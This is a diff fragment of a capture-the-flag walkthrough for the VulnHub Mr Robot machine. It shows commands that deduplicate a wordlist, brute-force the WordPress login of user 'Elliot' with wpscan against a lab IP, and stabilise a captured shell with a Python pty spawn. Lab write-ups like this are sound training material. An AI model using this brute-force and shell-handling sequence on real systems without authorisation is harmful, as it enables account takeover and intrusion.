@@ -61,9 +61,11 @@ Let's check that in the response tab.
 
 Now, let's brute force the password.
 We'll use the same file we used before but we need to remove duplicates from it.
+
 ```cat fsociety.dic | uniq > fsociety.txt```
 
 I'll use wpscan for the brute force but you can use any tool you like.
+
 ```wpscan --url http://192.168.56.102 -U Elliot -P fsocity.txt```
 
 ![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/mrRobot/pics/pic9.png)
@@ -84,6 +86,7 @@ We got a shell!
 ![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/mrRobot/pics/pic12.png)
 
 You can stable your shell with those two commands.
+
 ```python -c 'import pty;pty.spawn("/bin/bash")'```
 ```export TERM=xterm```
 
